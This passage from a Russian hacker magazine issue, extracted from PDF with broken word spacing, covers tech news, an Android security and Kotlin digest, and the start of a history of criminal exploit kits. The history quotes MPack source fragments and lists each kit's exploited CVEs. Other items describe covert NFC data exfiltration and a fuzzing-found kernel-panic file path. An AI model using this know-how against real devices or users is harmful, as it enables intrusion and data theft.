  Сабунджан сообщил, что в будущем году вый дет обновленная версия прог‐
  раммы — Winamp 6, в которой разработчики сохранят наследие медиапле‐
   ера, но сде лают слушательский опыт более полным. CEO Radionomy Group
   уверяет, что у Winamp до сих пор сущес твует огромная пользовательская
   база, насчитывающая порядка ста миллионов человек (в основном за пре‐
  делами США), и комьюнити по‐прежнему очень силь но.
     Нужно отме тить, что в сентябре текущего года пользователи уже обна‐
  ружили в Сети «утекшую» бета‐версию Winamp 5.8, где были исправлены
  некоторые баги и появилась поддержка Microsoft Audio. Тогда было не сов‐
  сем ясно, откуда взялась новая версия и кто сто ял за ее разработкой. Теперь
  Сабунджан прояснил, что в октябре действи тель но будет выпуще но обновле‐
  ние — Winamp 5.8. Новая версия содержит исправления для различных багов,
   в том числе касающихся совместимости с Windows 10, а также убирает
  из медиаплеера все платные функции, внедренные в Winamp ранее.
     Реальные нововведения мы увидим лишь с релизом Winamp 6, который
  выйдет как для десктопов, так и для мобильных ОС. Сабунджан рас сказывает,
   что обновленный медиаплеер смо жет объединить в одном месте аудио
  из самых разных источников, важную роль в его работе будет играть сущес‐
   твенно улучшенная поисковая функциональность, и пользовате лям больше
  не придется переключаться из одного плеера в другой. Пока разработчики
   отказались уточнить, идет ли речь об интегра ции с Apple Music, Spotify,
  Google Music и другими аудиоплатформами (и как это воз можно, если ответ
  положительный), сооб щив, что уже ведется множество переговоров, но о
  конкретике говорить пока рано.


  MICROSOFT ОТКРОЕТ ДОСТУП К 60 000 ПАТЕНТОВ РАДИ
 ПОДДЕРЖКИ LINUX

   Компания Microsoft присоединилась к Open Invention Network — плат форме, которая пре дос‐
   тавляет свободный доступ к патен там и помогает защищать Linux и другие свободные проекты
   от патентных исков. Они смогут получить дос туп к 60 000 патентам и не будут платить
   отчисления за их использование.


   Помимо Microsoft, в Open Invention Network входят и другие корпорации, в том чис ле Google,
   IBM, NEC, Philips, Sony и Toyota, а также разработчики дистрибутивов Linux — Red Hat, Canoni‐
    cal и SUSE.





 NFC‐АТАКА ДЛЯ
 ДЛИННЫХ
 ДИСТАНЦИЙ
  Сотрудник компании Checkmarx Пед ро Умбелино (Pedro Umbelino) про‐
  демонстрировал, что  технологию NFC можно эффективно использовать
  для извлечения с устройств небольших партий данных (паролей, ключей шиф‐
   рования), причем это возможно и на сравнительно дальних рас стояниях.
    По идее, NFC позволяет двум устройствам вза имодействовать вблизи,
  на расстоянии до 10 см друг от друга. В основном эта технология применя‐
   ется для платежей, аутентификации или обмена фай лами. Но Умбе лино раз‐
  работал атаку NFCdrip, которая позволяет экс плуатировать NFC на больших
  дистанциях и может использовать ся для тайного извлечения данных, если Wi‐
    Fi, Bluetooth или GSM отключены.
     NFCdrip требует смены режима экс плуатации NFC, и исследователь под‐
  черкивает, что на платформе Android для это го даже не нужно каких‐либо
  специальных разрешений, отчего ата ка ста новится еще проще. NFCdrip
  использует on‐oﬀ keying, одну из простейших форм амплитудной манипу‐
   ляции, когда наличие сигнала рас сматрива ется как 1 бит, а отсутствие —
   как 0 бит.
    В ходе своих экспериментов специалист сумел продемонс трировать,
   как малварь на Android‐устройстве может исполь зовать NFC для передачи
  паролей на расстоянии десятков метров от другого Android‐девай са, подклю‐
  ченного к простому AM‐приемнику.
      Так, передача информации на расстояние 2,5 мет ра завершилась полным
   отсутствием ошибок и работой на скорос ти 10–12 бит в секунду. На рассто‐
  янии 10 метров начинают появляться ошиб ки, одна ко Умбелино уверяет, что
  они поддаются корректировке и на этой дистанции передача данных воз‐
  можна даже через стены. В ито ге рекордное расстояние для передачи дан‐
   ных, протестированное специалистом, сос тавило 60 метров. Причем это зна‐
  чение можно еще увеличить, если подключить к делу AM‐антенну и SDR.
     Эксперт отмечает, что такая ата ка может сработать даже тогда, когда
  устройство находится в «режиме полета», и подчеркивает, что NFCdrip пред‐
   ставляет угрозу отнюдь не только для устройств на базе Android.
    В скором будущем Checkmarx пла нирует опубликовать PoC‐эксплоит
   в формате опенсор сного приложения. А пока на YouTube можно посмотреть
  PoC‐видео с демонстрацией ата ки и презентацию метода NFCdrip на Hack.lu.


 ВИДЕОКАРТЫ ДЛЯ МАЙНИНГА ПРИНОСЯТ ВСЕ МЕНЬШЕ
 ПРИБЫЛИ

   Компания AMD опубликовала отчет за третий квартал 2018 года, согласно которому общая при‐
   быль от продаж графических процес соров снизилась на 14% по срав нению со вторым квар‐
   талом, однако выросла на 12% по сравнению с прошлым годом.

   Тем временем общий доход ком пании вырос до 1,65 миллиарда дол ларов, что на 4% больше,
   чем в прошлом году.


   Отдельное внимание в отчете было уделено GPU для крип товалютного рынка: представите ли
  AMD признали, что доходы в этой области оказались весьма незначительными и сос тавили все‐
   го 6%.

   После публикации документа котировки акций ком пании рухнули на 22%, хотя спад про даж
   майнинговых видеокарт прогнозировали уже давно.



  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Утечка гелия вывела из строя iPhone сотрудников в медицинском учреждении Иллинойса


   Разработчик Mirai не сядет в тюрьму, но дол жен вып латить 8,6 мил лиона долларов


   Компания Group‐IB рассказала о задержании мошенников, которые прикидывались white
   hat’ами


   Google обяжет производителей выпускать патчи для Android‐устройств на про тяже нии двух лет


   Опубликован бесплатный дешифратор для последних версий GandCrab


   Третьи стороны могут следить за пользовате лями через механизм возобновле ния TLS‐соеди‐
   нения


  В кампании MageCart задействованы уязвимос ти как минимум в двадцати расширениях
   для Magento


  Еще одну 0day‐уязвимость в Windows рас крыли через Twitter


  Обнаружены заражения малварью DarkPulsar, ранее «утекшей» у АНБ


   Исследователь устроил атаку 51% на Bitcoin Private и стримил ее в прямом эфи ре
HEADER
   ANDROID

            SECURITY‐ЧИП В СМАРТФОНЕ
            PIXEL 3, ЗАЩИТА ОТ ROP В ЯДРЕ
                 И УРОКИ ФАЗЗИНГА





                                                                              Евгений Зобнин
                                                                                    Редактор Unixoid и Mobile
                                                                                                  zobnin@glc.ru





Сегодня в выпуске: новый security‐чип в смартфоне Pixel 3, защита от атак
с использованием ROP в ядре Linux, уроки фаз зинга, смартфон, ворующий
рекламные деньги, прошлое, настоящее и будущее пакетов APK. А также нес‐
колько статей для программистов: управление приоритетами потоков, раз‐
бор системы типов Kotlin и рас сказ о Contracts — новой функции Kotlin 1.3.


                   ИНСТРУМЕНТЫ


 • android‐device‐check — скрипт для проверки настроек безопасности
  смартфона на Android;
 • AES Killer — плагин Burp Suite для расшифровки трафика мобильных при‐
   ложений с помощью ключа, извлеченного из при ложе ния;
 • awesome‐iot‐hacks — коллекция ссылок на информацию о багах различных
   IoT‐устройств.


                      ПОЧИТАТЬ


Titan M: security-чип в смартфо нах Pixel
Building a Titan: Better security through a tiny chip — рассказ о security‐чипе Titan
M, который используется в смартфонах Pixel 3 и Pixel 3 XL. Чип разработан
и производится самой Google, а в число его функций входят:
 • хранение счетчиков откатов, используемых системой доверенной загрузки
   Android Veriﬁed Boot;
 • хранение секретных данных и огра ничение попыток доступа  к ним
   с помощью Weaver API;
 • реализация функций модуля Strongbox Keymaster, который отвечает в том
   числе за хранение и генерацию ключей шифрования, а также за функцию
   Android Protected Conﬁrmation, позволяющую математически доказать, что
   пользователь действитель но увидел тот или иной диалог подтверждения
   и что ответ на этот диалог не был перехвачен и каким‐либо образом изме‐
   нен;
 • обеспечение работы механизмов защиты от сброса до заводских настро‐
   ек, которые не позволя ют третьим сторонам использовать потерянный
   или украденный смартфон.

По сути, Titan M — это ана лог Secure Enclave, который Apple уже несколько
лет предустанавливает в свои смартфоны. Бла года ря тому что Titan M —
это выделенный мик рокомпь ютер (на базе ARM Cortex‐M3), не связанный
с основным процессором, он гораздо более устой чив к любым атакам, вклю‐
чая «неисправляемые» Rowhammer, Spectre и Meltdown.
   Google обещает открыть код прошивки Titan M в скором времени.





                           Titan (слева) и Titan M (справа)


Control Flow Integrity для ядра Linux
Control Flow Integrity in the Android kernel — статья раз работчиков Android
о применении технологии Control Flow Integrity для защиты ядра Linux от атак
с использованием метода ROP (Return Oriented Programming).
  Современные экспло иты в своей работе час то полагаются на модифи‐
кацию указателей на функцию и адресов воз вра та. Это позволяет обойти
ограничение на исполнение стека и сегмента данных с помощью пере‐
использования кусков самого приложения.
   Технология Control Flow Integrity (CFI) предназна чена для борьбы с такими
эксплоитами. При ее включении компилятор стро ит граф вызовов функций
и встраивает код сверки с этим графом перед каждым вызовом функции.
Если вызов происходит по откло няющемуся от гра фа адресу, приложение
завершается.
  Ранее разработчики Android уже включили CFI для нескольких сис темных
компонентов в Android 8. В Android P покрытие расширилось и теперь вклю‐
чает в себя медиафреймворки, а также стек NFC и Bluetooth. Теперь под дер‐
жка реализована для ядра версий 4.9 и 4.14.


Уро ки фаз зинга
Writing the worlds worst Android fuzzer, and then improving  it — занимательная
статья о том, как обыч но проводят фаззинг и какую информацию взломщик
может получить с его помощью.
  Началось все с того, что автор решил устроить фаззинг файловой сис темы
Android и попробовать прочитать и записать во все встреченные файлы слу‐
чайный набор байтов. Расчет здесь на то, что в Android (а точнее, Linux) нес‐
колько виртуальных файловых систем (/dev, /proc, /sys) хранят не реальные,
а синтетические файлы, с помощью которых можно изменять настройки ядра
и работать с железом.
   Как оказалось, дол го фаззер работать не мог и в определенный момент
просто блокировался при попытке чтения файла. Чтобы решить эту проблему,
автор распараллелил фаззер на 128 потоков, и... смартфон ушел в kernel pan‐
ic. То же повторилось с каждым из протестированных смартфонов.
   Анализ лога из /proc/last_kmsg показал, что произошло что‐то вроде
heap  corruption,  и, если поковырять дальше, можно написать эксплоит
для получения прав root в системе. А DoS‐эксплоит фактически уже сущес тву‐
ет.
  Но что, если файла /proc/last_kmsg нет? Например, в Galaxy S5 такой
файл отсутствует, а значит, мы не сможем узнать, обращение к какому файлу
привело к панике ядра. В этом случае для начала сокращаем область работы
фаззера, пробуем, например, только каталог /sys. Это срабаты вает, проб‐
лема в одном из его файлов. Проходимся по подкаталогам и выясняем, что
ядро падает при записи в один из файлов /sys/kernel, а если точнее — /
sys/kernel/debug/.
   Чтобы не перебирать все файлы это го подкаталога вручную, пишем сер‐
вер, который будет работать на компе и принимать имена фай лов от фаззера
по мере его работы. Какое пос леднее имя получим перед падением, то нам
и нужно.
  Последним файлом оказался /sys/kernel/debug/smp2p_test/ut_re‐
mote_gpio_inout. Теперь написать DoS‐экс плоит проще простого.
   Автор отмечает, что в современном мире оста ется все меньше телефо‐
нов, которые можно отправить в панику таким спо собом. Все дело в правилах
SELinux, которые закрыва ют доступ к большинству сис темных файлов. Однако
некоторые устройства до сих пор уяз вимы.


Смартфон, вору ющий рек ламные деньги
Avast Threat Labs ﬁnds Android device ﬁrmware that reroutes ad network revenue
to unknown accounts — интерес ная история в блоге Avast о прошивке дешево‐
го китайского телефо на, которая не только содержит привычную всем рек‐
ламу на экране блокировки и умеет скрыто уста навливать приложения, но и
перенаправляет выручку от рекламы в сторонних приложениях на другие
аккаунты.
  Прошивка включает в себя нес колько хуков, которые срабаты вают, когда
то или иное приложение обра щается к настройкам (SharedPreferences), фай‐
лам внутри своего пакета (AssetManager и ZipEntry) или передает данные
между своими компонентами в бандлах (Bundle). Код хука ищет в полученных
данных токен рекламной сети и подменя ет его своим, так что все деньги
от показа рекламы получает не разработ чик приложения, а третье лицо.
  Специалисты из Avast не сообщают модель устройства, на которое была
предустановлена эта прошивка. Известно лишь, что смартфон работал на An‐
droid 6 и продавался в Европе. Хотя, судя по файлу с информацией о при‐
ложениях, токены которых перехватывала прошивка, основной целью были
китайские пользователи.





         Какие где найти токены и на какие зна чения их заменить


                    РАЗРАБОТЧИКУ


Kotlin и его типы
Typical Kotlin — статья о системе типов языка Kotlin и ее особенностях. Нес‐
колько интересных моментов:
 • Nullable и не nullable типы в Kotlin — это действительно разные типы дан‐
   ных, причем не nullable тип — это всег да подтип nullable. Например, Dou
  ble — это подтип типа Double?, а тот, в свою очередь, подтип типа Num
  ber?, который подтип типа Any?. Таким образом, значение типа Double
  можно сохранить в переменной типа Number?.
 • Когда ты создаешь какой‐либо класс, ты автоматически создаешь его nul‐
   lable или наоборот близ неца. Дру гими словами, объ явив класс Hello, ты
   также объявишь тип Hello?.
 • Технически любая фун кция в Kotlin имеет тип возвращаемого значения.
   Если не указано явно, этим типом ста новится Unit. Вот его исходный код:


public object Unit {
    override fun toString() = "kotlin.Unit"
}

 • В Koltin есть специальный тип, который не может иметь никакого значения.
   Это тип Nothing (и его близнец Nothing?). Функция, объ явленная с воз‐
   вращаемым типом Nothing, никог да не закон чит исполне ние, так как зна‐
   чения, которое нужно вернуть, не сущес твует. Nothing удобно исполь‐
   зовать, чтобы подска зать компилятору и среде разработки, что функция
   никогда не закончит свое исполнение (или закончит выбросом исклю‐
   чения). В этом случае среда разработки будет подсвечивать такие фун‐
   кции, подсказывая раз работчику, что ее исполнение не закончится.
 • Nothing — это так называемый bottom type, то есть подтип любых дру гих
   типов. А return и throw — это полноценные выражения, которые возвра‐
  щают тип Nothing. Комбиниру ем эти два утверждения вместе и получаем
   два вполне рабочих примера кода:


fun calculate(someParam: Int?) {
    val x = someParam ?: throw IllegalArgumentException("someParam
must not be null")
    val y = x * 2
    println(y)
}


fun calculate(someParam: Int?) {
    someParam ?: return
    val y = someParam * 2
    println(y)
}





                     Иерархия типов в Kotlin


Управляем приоритетами потоков
Exploring Android Thread Priority — статья о том, как Android распре деляет при‐
оритеты между потоками и как эти приоритеты изменить. Суть в следующем.
В Android (а точнее, в Linux) у каждого потока исполнения есть собс твенный
приоритет, который варьиру ется в пределах от –20 до 19, где меньшее число
означает более высокий приоритет.
  Плюс ко всему ядро Linux объединяет потоки в так называемые контроль‐
ные группы (cgroups) в зависимос ти от разных условий, таких, например,
как видимость приложения на экране. Раз мещение потоков того или иного
приложения в определенной груп пе автомати чес ки накладывает на них огра‐
ничения. Так, потоки, помещенные в группу Background (то есть относящиеся
к приложениям в фоне), получают всего 5% от общего процессорного вре‐
мени.
  По умолчанию любые потоки одного приложения получают равный при‐
оритет с основным потоком, а зна чит, могут влиять на его исполнение. Чтобы
этого избежать, сле дует снизить при оритет фоновых потоков с помощью
одного из двух методов:
 • Thread.setPriority() — принима ет зна чения от 1 до 10, где 10 —
  самый высокий приоритет;
 • Process.setThreadPriority() — принимает стандартные для An‐
   droid/Linux значения от –20 до 19.

Соотношение этих двух шкал приоритетов такое:





Пример изменения приоритета потока:


public class ThreadPriority {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                Process.setThreadPriority(Process.THREAD_PRIORITY
_BACKGROUND);
                // Твой код здесь
            }
        }, "worker‐thread");
        thread.start();
    }
}

В оригинальной статье также приведены примеры изменения приоритета
HandlerThread, Intent Service и других.


Contracts — новая фун кция Kotlin 1.3
Discovering Kotlin Contracts — статья о новинке Kotlin 1.3 под названием «кон‐
тракты» (contracts). Они решают проб лему, с которой сталкивался любой раз‐
работчик. Простой пример:


@Test fun testMyTokenLength() {
    val token : String? = getMyToken();
    assertNotNull(token)
    assertEquals(42, token.length)
}

Ты не сможешь его скомпилировать, потому что компилятор скажет сле‐
дующее:



        Error(5, 22): Only safe (?.) or non-null asserted (!!.) calls are allowed on a
       nullable receiver of type String?

Так происходит потому, что, по мнению компилятора, token может иметь зна‐
чение null, а значит, мы должны проверить его на null перед тем, как вызывать
метод length. Ну либо обойти предупреждение компилятора, написав так: to‐
ken!!.lenght. А это не очень кра сиво.
  В то же вре мя мы, в отличие от компилятора, зна ем, что token к моменту
вызова метода length уже не может быть null, потому что проверка на null была
в прошлой строке. Контракты нужны как раз для того, чтобы передать наше
знание компилятору.
   Контракты базируются на идее эффектов (eﬀects), которые представляют
собой своего рода кусочки зна ний, относящиеся к той или иной функции.
На данный момент существу ет четыре эффекта:
 • Returns(value) — функция успешно завершается и/или воз вращает
   значение такого‐то типа;
 • ReturnsNotNull — функция возвращает не null значение;
 • ConditionalEffect(effect, booleanExpression) — если эффект
   сработал, то следующее выражение верно;
 • CallsInPlace(lambda, kind) — огра ничение на место и количество
   вызовов лямбды.

Не стоит пытаться это понять, прос то взгляни на следующий код:


fun assertNotNull(actual: Any?) {
    contract { returns() implies (actual != null) }
    org.junit.Assert.assertNotNull(actual)
}

Это обертка для стандартной функции assertNotNull из пакета JUnit. Мы
добавили к ней контракт, который сообщает компилятору и среде разработ‐
ки, что если функция успешно завершается, значит, переданное ей в аргу‐
менте значение не равно null. Если подста вить эту обертку вместо ори гинала
в приведенный в начале пример, компилятор ругаться не будет.


Цифровые под писи APK: прош лое и настоящее
Android APK signature scheme v3: context and new opportunities — краткая исто‐
рия цифровых подписей приложений для Android и объ яснение нового фор‐
мата цифровой подписи в Android 9.
  Изначально пакет с приложением для Android (APK) представлял собой
почти точную копию пакета JAR, который, в свою очередь, был прос то архи‐
вом ZIP с несколькими дополнительными фай лами в каталоге META‐INF. Эти
файлы содержали список всех файлов пакета, их криптографичес кие хеши,
а также открытый крип тографичес кий ключ, с помощью которого были под‐
писаны списки хешей.
  Все это позволяло убедиться в целос тности содержащихся в пакете фай‐
лов, а также подтвердить, что пакет не был изменен после создания автором.
Другими словами, устанавливая обновление приложения для Android, можно
быть уверенным — оно соз дано тем же человеком, что и пре дыду щая версия.
  Но есть проблема. Ата ка Janus показала, что существует возможность
внедрить код в APK, не изменяя его цифровую подпись. Для этого можно
дописать DEX‐файл в начало секций ZIP‐файла, и Android не учтет их
при верификации файла, но при  этом файл можно  будет  запус тить
как  исполняемый:  это  будет  одновременно  и  пакет  с  приложением,
и исполняемый файл.
  Для решения этой и схожих проблем Google предложила формат циф‐
ровой подписи APK signature scheme v2. Его суть в том, чтобы добавить
к APK‐файлу допол нительный блок, который будет содержать цифровую под‐
пись всего APK целиком, а не отдельных его час тей.
  Поддержка scheme v2 появилась в Android 7, а уже в Android 9 добавилась
поддержка APK signature scheme v3. Новый формат циф ровой подписи похож
на предыдущий, но обладает одной отличительной чертой: он под держивает
ротацию криптографических ключей. Это поз воляет разработчикам без проб‐
лем менять цифровую подпись для своих приложений, не заставляя поль‐
зователей удалять старую версию приложения перед установкой новой.





                    APK signature scheme v1


Пять биб лиотек анимации
Android Top Animation Libraries — краткий обзор пяти биб лиотек, позволяющих
реализовать анимацию в приложении:
 • Lottie for Android — парсит и рендерит анимации в формате Adobe After Ef‐
   fects (экспортированные в JSON с помощью Bodymovin);
 • Material Animations — эффекты перехода меж ду активностями;
 • Android View Animations — коллекция различных эффектов анимации;
 • RecyclerView Animators — набор ани маций для RecyclerView;
 • Rebound — реализация реалистичных эффектов пружины.


Биб лиоте ки
 • FeatureAdapter — RecyclerView‐адаптер, предназначенный для соз дания
   комплексных списков;
 • FBToast — библиотека для создания слож ных кас томных сообщений;
 • view‐eﬀects — добавлять различные визуальные эффекты для фона вид‐
   жета (например, блюр);
 • FingerprintIdentify — библиотека для работы с датчиками отпечатков паль‐
   цев, способная работать не только с нативным API Android, но и с API Sam‐
   sung и Meizu (до Android 6.0);
 • Protein —  плагин  Android  Studio,  генерирующий  код —  заглушки
   для Retroﬁt2 и RxJava2;
 • AppJoint — фреймворк для соз дания модульных приложений;
 • Krate — враппер для работы с нас трой ками из  Kotlin, выполненный
   с использованием делегированных переменных;
 • SnapTabLayout — реализация табов приложения в стиле Snapchat;
 • Android‐GoldenEye — прос тая в использовании библиотека для работы
   с камерой;
 • Android‐Goldﬁnger — библиотека для работы с датчиком отпечатков паль‐
   цев;
 • android‐gpuimage — библиотека для обра ботки изоб ражений на гра‐
   фическом процессоре, аналог GPUImage для iOS;
 • ok‐gradle — плагин для Android Studio, запускаешь, вбиваешь имя нужной
  библиотеки и получаешь строку, которую необ ходимо добавить в build.gra‐
   dle для ее подключения.
COVERSTORY

ВОЗРОЖДЕНИЕ

  ЭКСПЛОИТ-КИТОВ





                          Compañero
                        omenmaggot@gmail.com
    15 САМЫХ УБОЙНЫХ
   ПАКОВ ЭКСПЛОИТОВ
      ВСЕХ ВРЕМЕН





На страницах «Хакера» ты наверняка встречал немало упоминаний об экс пло‐
ит‐паках. Однако за редким исключением речь шла о паках‐однодневках,
исчезающих с рынка спустя год‐два после пер вого попадания в лаборатории.
В этой статье мы поговорим о паках‐долгожите лях, которые упорно отказыва‐
ются уходить в прошлое. Некоторые из них лишь набирают популярность.



                   СТАРАЯ ГВАРДИЯ


MPack-kit
Год появления: 2006
Пик популярности: 2006–2007
Це на: 1000 долларов в год
  Все началось с небезызвес тного MPack‐kit, который появился в 2006 году
благодаря сообществу трех русских программистов Dream Coders Team.
Идея была в том, чтобы создать удоб ную в исполь зовании упаковку для нес‐
кольких эксплоитов сразу, причем уже известных или же купленных у сторон‐
них разработчиков. Стоил он относитель но недорого (500–1000 дол ларов)
и часто обновлялся. Также существовала воз можность докупать модули
с новыми эксплоитами отдельно и получать поддержку разработчиков.
  Все это фактически делает MPack‐kit первым дей ствительно успешным
теневым бизнес‐проектом в этой сфере, авторы которого отве чали за качес‐
тво и за свой продукт. За время его сущес твования (а это поряд ка двух лет
успешной работы) при помощи этого пака только по официальной статистике
было заражено свыше 160 тысяч серверов. Из громких происшествий можно
вспомнить атаку на Банк Индии в 2007 году: есть подоз рение, что в ней при‐
менялся этот пак и экспло иты из него, однако это так и не было под твержде‐
но.


             INFO

                   В MPack‐kit в числе прочего входят эксплоиты
                      CVE‐2006‐0003,   CVE‐2006‐0005,   CVE‐2006‐
                     3643,  CVE‐2006‐5745,  CVE‐2006‐3730,  CVE‐
                       2006‐5198, CVE‐2007‐0015 и CVE‐2007‐0038.


Сами исходники MPack довольно незамысловатые. Начинаются они вот
с такой порции спагетти.


if (strstr($user_agent, "Nav")) $browser = "Netscape";
elseif (strstr($user_agent, "Netscape")) $browser = "NetScape";
elseif (strstr($user_agent, "Firefox")) $browser = "Firefox";
elseif (strstr($user_agent, "Lynx")) $browser = "Lynx";
elseif (strstr($user_agent, "Opera")) $browser = "Opera";
elseif (strstr($user_agent, "WebTV")) $browser = "WebTV";
elseif (strstr($user_agent, "Konqueror")) $browser = "Konqueror";
elseif (strstr($user_agent, "Bot")) $browser = "Bot";
elseif (strstr($user_agent, "MSIE")) $browser = "MSIE";
else $browser = "Unknown";
if (strstr($user_agent, "Windows 95")) $os = "Windows 95";
elseif (strstr($user_agent, "Windows NT 4")) $os = "Windows NT 4";
elseif (strstr($user_agent, "Win 9x 4.9")) $os = "Windows ME";
elseif (strstr($user_agent, "Windows 98")) $os = "Windows 98";
elseif (strstr($user_agent, "Windows NT 5.0")) $os = "Windows 2000";
elseif (strstr($user_agent, "SV1")) $os = "Windows XP SP2";
elseif (strstr($user_agent, "Windows NT 5.1")) $os = "Windows XP";
elseif (strstr($user_agent, "Windows NT 5.2")) $os = "Windows 2003";
else $os = "Unknown";

После определения браузера и ОС запускались скрипты на JS.


echo "<SCRIPT language=\"javascript\">\n var url=\"".$url."\";\n";
include("rds.js");
echo "\n\n";
include("FolderIcon.js");
echo "</script>";

При помощи них уже и происходит эксплуатация.
  В срав нении с ближайшими пос ледователями этот эксплоит‐кит имел
крайне продуманную админку. Она поз воляла получить данные о целях
в удобнейшем виде.


WebAttacker
Год появления: 2006
Пик популярности: 2006–2007
Це на: рекордно малые 50 долларов за самую первую копию, 400 дол ларов
в месяц за последующие доработ ки первой версии
  Примерно в это же время развивался пак WebAttacker, создатели которого
не раз взаимодействовали с Dream Coders Team. Он был более дешев (350–
400 долларов), однако проект быстро сдулся, и обещанная к 2007 году вто‐
рая версия так и не вышла, несмотря на регулярные обновления до этого
момента.
  Объяснить исчезновение можно одним важным отличием команды соз‐
дателей WebAttacker от Dream Coders Team. «Дримкодеры» не раз говори ли,
что не планируют занимать ся никакой преступной деятельностью, работают
на обычных «белых» дол жнос тях, а паком занимаются в свобод ное время. Что
до создателей WebAttacker, то они больше склонялись к сообществу кибер‐
преступников, при этом сам продукт не был конкурентоспособен для тенево‐
го рынка.
  На короткое время наследником MPack‐kit стал IcePack, который во мно‐
гом превзошел предшественников, но за его быс трым взлетом пос ледовало
столь же быстрое падение. В то время эксплоит‐паки стали обычным товаром
на рынке кибер преступников. Уже в 2007 году появились NeoSploit, Phoenix,
Armitage и Tornado.
  И если Tornado и Armitage практичес ки не зашли, то на NeoSploit буквально
за пару лет стало приходиться 30% зараженных компьюте ров. Он просущес‐
твовал вплоть до 2011 года, обновившись в 2010‐м до второй версии.


AdPack и FirePack
Год появления: 2008
Пик популярности: 2008
Це на: информация утра чена
  В 2008 году вышли AdPack и FirePack, которые, впрочем, не нашли своего
покупателя и скоро почти бесследно погасли, несмотря на их удобство. Оба
имели встроенные крип торы, были очень просты в установке, а также имели
ряд полезных фич в админке (например, филь тра ция по странам). Пережив
по паре версий, оба исчезли с рынка.
  Во многом это можно списать на не слиш ком удачный год выхода
на рынок. Ведь в 2008 году антивирусные компании уже окончательно
утвердились в своих опа сениях по поводу вреда от эксплоит‐китов. К этому
времени MPack, IcePack и NeoSploit заразили огромное количество компь‐
ютеров. На графике ниже, составленном одной из антивирус ных компаний,
как раз видно это затишье.





                     График компании Trend Micro


Eleonore
Год появления: 2009
Пик популярности: 2009–2010
Це на: 1000 долларов в год
  В 2009 году, напротив, появились дос тойные экземпляры. Как, например,
Eleonore. Этот эксплоит‐кит стал хитом 2009–2010 годов. За вре мя его
существования  было  выпущено  шесть  версий.  Основными  векторами
для атак были фреймворк Java и про дукты Adobe.
  В отличие от своих предшественников Eleonore не имел жесткой привязки
к браузерам — как раз за счет того, что внедрение зачастую проходи ло через
PDF.


             INFO

                     К 2012 году, когда вышла последняя версия,
                        в Eleonore входили CVE‐2006‐0003, CVE‐2006‐
                      4704, CVE‐2008‐2463, CVE‐2010‐0188, CVE‐2010‐
                     0806, CVE‐2010‐1885, CVE‐2010‐4452, CVE‐2011‐
                     0558, CVE‐2011‐0559, CVE‐2011‐0611, CVE‐2011‐
                     2462, CVE‐2011‐3521, CVE‐2011‐3544.



Phoenix
Год появления: 2009
Пик популярности: 2009–2012
Це на: 2200 долларов в год
  Следующим в том же 2009 году вышел Phoenix, который составил мощную
конкуренцию Eleonore. За время существо вания он девять раз обновлялся и,
вероятно, поэтому был самым дорогим на рынке — 2000–2200 долларов.
Для атак точно так же использовались уста ревшие версии плагинов Adobe
и Java, причем экспло итов для продуктов Adobe было неприлично много —
целых семь. По некоторым данным, автор пака AlexUdakov был арестован
в 2013 году. По крайней мере, он об этом написал на сайте, где продавал ся
эксплоит (увы, сейчас это сообщение уже убра ли).





                      Скриншот продажника



                НОВОЕ ДЕСЯТИЛЕТИЕ


BlackHole
Год появления: 2010
Пик популярности: 2010–2013
Це на: 1500 долларов в год
  Следующая  пачка  дос тойных  внимания  эксплоит‐китов  появи лась
в 2010 году. Главный из них — печально извес тный BlackHole. BlackHole быс‐
тро нашел своего покупателя и уже  к концу 2011 года стал лидером
по заражению компьютеров.
   Страничка с BlackHole распространялась в основном при помощи спама,
а сам механизм работы был довольно прост, но эффекти вен. В «Хакере» есть
его подробное описание в статье «Раз бираем внутреннос ти BlackHole exploit
kit» за 2011 год.
  Все исходники BlackHole были защищены при помощи IonCube, что
отчасти сде лало BlackHole в своем роде новаторским. Дело в том, что
до него практически все экс плоит‐киты заимство вали друг у друга наиболее
удачные куски кода, и это прослежива ется в исходниках большинства из них.
   BlackHole на тот момент имел самый дружественный интерфейс. К тому же
в апдейтах появ лялись действитель но полезные нововведения. Например,
не было перегрузки экспло итами: буквально после первого же обновления
остались только самые эффективные. Также была возможность редиректа
трафика после заражения в дру гое мес то назначения. То есть, по сути, сам
эксплоит‐кит можно было использовать между источником и целью. Помимо
этого, BlackHole мог бло кировать неугодные реферер‐заголовки, поль‐
зователей с Tor или же конкрет ные диапазоны IP‐адресов.


Nuclear
Год появления: 2009
Пик популярности: 2011–2012
Це на: 900 долларов в год
  В это же вре мя в полноценном виде появился эксплоит‐кит Nuclear. Его
первая версия вышла еще в конце 2009 года, но она была откровенно сырой.
Nuclear на тот момент не подавал осо бых надежд, однако уже к 2012 году
стал лидером. Код Nuclear максимально обфусци рован, в нем много объ‐
явленных в разных местах переменных и функций, которые не используются.
  Основными век торами атаки все так же оста лись продукты Adobe. Вооб‐
ще, пак Nuclear содержал преимущественно свежие экс плоиты, что, веро‐
ятнее всего, и позволило ему стать настолько популярным и продержаться
на плаву вплоть до 2016 года. Также, чтобы усложнить анализ самого процес‐
са работы, Nuclear использовал трехс траничную переадресацию.


Sweet Orange
Год появления: 2012
Пик популярности: 2013–2015
Це на: 2500 долларов в год
  Своего рода всплеск экс плоит‐китов, причем крупных и эффективных,
произошел в 2012 и 2013 годах. В 2013‐м, в час тности, несмотря на меньшее
количество новых эксплоит‐китов, их активность выросла. Тремя главными
паками 2012 года можно наз вать Sweet Orange, Styx и FlashPack.
   Sweet Orange появился в 2012 году, далеко не сразу стал популярным,
однако содержал плотный кос тяк из экс плоитов для Java, которые обошли
вниманием другие эксплоит‐киты того года, а именно CVE‐2012‐1723, CVE‐
2013‐2424, CVE‐2013‐2460 и CVE‐2013‐2471.
   Sweet Orange регулярно обновлялся, в 2014 году в него добавили CVE‐
2014‐6332, CVE‐2014‐0515, CVE‐2014‐0569. Пробив у этого пака был сред‐
ненький, порядка 10%, однако имелся ряд при ятных функций. Например,
встроенный криптор iframe и подклю ченный API Scan4you, благодаря чему
можно было уследить за чистотой кода и распространяемого файла.





                        Скриншот криптора

До появления практически легендарных экс плоит‐китов Sweet Orange не сда‐
вал позиции. К примеру, в 2014 году, по данным Trend Micro, около 35%
зараженных компьютеров пос тра дали именно из‐за него.


Styx
Год появления: 2012
Пик популярности: 2012
Це на: 3000 долларов
   Styx, вышедший вслед за Sweet Orange, вспыхнул и так же быстро затух.
Это был актуальный, мощный, удобный эксплоит‐пак, содержавший актуаль‐
ные эксплоиты вроде CVE‐2013‐2551 по соседс тву с откровенным старьем
